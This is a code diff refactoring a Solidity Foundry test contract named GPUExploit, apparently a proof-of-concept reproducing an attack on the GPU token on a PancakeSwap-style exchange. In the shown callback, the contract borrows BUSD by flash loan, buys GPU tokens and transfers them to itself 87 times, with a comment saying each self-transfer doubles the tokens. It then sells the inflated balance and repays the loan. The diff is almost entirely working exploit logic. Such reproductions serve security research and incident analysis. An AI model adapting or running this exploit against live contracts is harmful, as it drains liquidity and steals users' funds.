@@ -43,24 +43,26 @@ contract GPUExploit is Test {
     }
 
     function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
-        // Define the swap paths
-        address[] memory buyPath = getPath(address(busd), address(gpuToken));
-        address[] memory sellPath = getPath(address(gpuToken), address(busd));
+        //Buy tokens with flashloaned busd
+        _swap(amount0, busd, gpuToken);
 
-        uint256 amountOut = router.getAmountsOut(amount0, buyPath)[1];
-
-        router.swapExactTokensForTokens(amount0, amountOut, buyPath, address(this), block.timestamp);
-
+        //Self transfer tokens to double tokens on each transfer
         for (uint256 i = 0; i < 87; i++) {
             selfTransfer(gpuToken);
         }
 
-        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            type(uint112).max, 1, sellPath, address(this), block.timestamp
-        );
+        //Sell all tokens to busd
+        _swap(type(uint112).max, gpuToken, busd);
+
         //Payback flashloan
         uint256 feeAmount = (amount0 * 3) / 1000 + 1;
         busd.transfer(address(busdWbnbPair), amount0 + feeAmount);
+    }
+
+    function _swap(uint256 amountIn, address tokenA, address tokenB) private {
+        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            amountIn, 0, getPath(tokenA, tokenB), address(this), block.timestamp
+        );
     }
 
     function getBalance(IERC20 token) private view returns (uint256) {
@@ -68,10 +70,6 @@ contract GPUExploit is Test {
     }
 
     function selfTransfer(IERC20 token) internal {
-        transferTokens(gpuToken, address(this), getBalance(gpuToken));
-    }
-
-    function transferTokens(IERC20 token, address recipient, uint256 amount) private {
-        token.transfer(recipient, amount);
+        token.transfer(address(this), getBalance(gpuToken));
     }
 }
